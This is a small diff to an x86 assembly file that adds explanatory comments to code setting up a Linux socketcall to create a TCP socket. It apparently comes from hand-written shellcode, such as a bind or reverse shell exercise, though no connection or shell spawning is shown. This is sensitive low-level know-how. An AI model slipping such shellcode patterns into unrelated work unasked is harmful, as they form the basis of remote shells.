@@ -28,12 +28,13 @@ mov al, 0x66 ; socketcall syscall
 xor ebx, ebx
 mov bl, 0x1  ; socket syscall
 
+; push values of domain, type and protocol to the stack
 xor ecx, ecx
 push ecx ; protocol : tcp
 push 0x1 ; socket type : SOCKET_STREAM
 push 0x2 ; domain : AF_INET
 
-mov  ecx, esp
+mov  ecx, esp ; makes ecx point to the top of the stack in order to get the arguments
 int 0x80 ; launch the syscall
 
 xor edx, edx
